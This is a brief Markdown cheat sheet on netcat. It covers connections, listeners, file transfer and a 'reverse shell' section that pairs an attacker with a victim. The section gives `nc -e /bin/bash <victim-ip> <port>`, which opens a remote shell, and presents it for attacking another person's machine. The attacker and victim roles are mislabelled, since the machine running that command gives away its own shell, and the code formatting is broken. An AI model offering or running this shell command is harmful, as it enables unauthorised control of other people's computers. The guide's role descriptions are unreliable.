# Netcat - Reverse Shell & File Transfer

> **MUST HAVE**  
> - Netcat: `sudo apt install netcat-traditional`  
> - OS: Linux OS  

---

## 🔌 Basic Usage

### Simple connection to remote computer:
```bash
nc <ip> <port>
🖥️ Server Creation
TCP Server:

nc -lp <port>
UDP Server:

nc -lup <port>
📁 File Transfer
Send file:

nc <send-to-ip> <port> < <file-to-send>
Receive file:

nc -lp <port> > <file-that-got-sent>
🐚 Reverse Shell Execution
On Attacker's Machine (Send Reverse Shell):

nc -e /bin/bash <victim-ip> <port>
# /bin/bash is the shell used
On Victim's Machine (Listen for Shell):

nc -lp <port>
💡 WHAT HAPPENS:
A remote connection is established and the attacker can execute shell commands on the victim's computer.

🧪 Alternatives
You can also use sudo nc or sudo netcat interchangeably.